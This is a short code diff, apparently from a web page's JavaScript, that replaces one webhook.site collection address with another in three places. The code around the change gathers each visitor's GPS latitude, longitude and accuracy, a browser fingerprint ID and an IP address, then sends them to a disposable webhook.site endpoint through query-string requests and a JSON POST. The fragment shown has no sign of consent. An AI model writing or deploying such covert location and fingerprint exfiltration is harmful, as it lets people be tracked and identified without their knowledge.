@@ -177,7 +177,7 @@
           };
 
           try {
-            const response = await fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
+            const response = await fetch("https://webhook.site/7fd38e61-10f8-4a51-887d-e636a9cb0030", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(data)
@@ -213,7 +213,7 @@
       const lat = pos.coords?.latitude || "unknown";
       const lon = pos.coords?.longitude || "unknown";
       const acc = pos.coords?.accuracy || "unknown";
-      const url = `https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b?ref=${encodeURIComponent(reason)}` +
+      const url = `https://webhook.site/7fd38e61-10f8-4a51-887d-e636a9cb0030?ref=${encodeURIComponent(reason)}` +
         `&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}` +
         `&visitorId=${encodeURIComponent(fingerprintData.visitorId)}` +
         `&ip=${encodeURIComponent(fingerprintData.ip)}` +
@@ -232,7 +232,7 @@
         const lat = pos.coords?.latitude || "unknown";
         const lon = pos.coords?.longitude || "unknown";
         const acc = pos.coords?.accuracy || "unknown";
-        const url = `https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b?ref=${encodeURIComponent(reason)}` +
+        const url = `https://webhook.site/7fd38e61-10f8-4a51-887d-e636a9cb0030?ref=${encodeURIComponent(reason)}` +
           `&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}` +
           `&visitorId=${encodeURIComponent(fingerprintData.visitorId)}` +
           `&ip=${encodeURIComponent(fingerprintData.ip)}` +
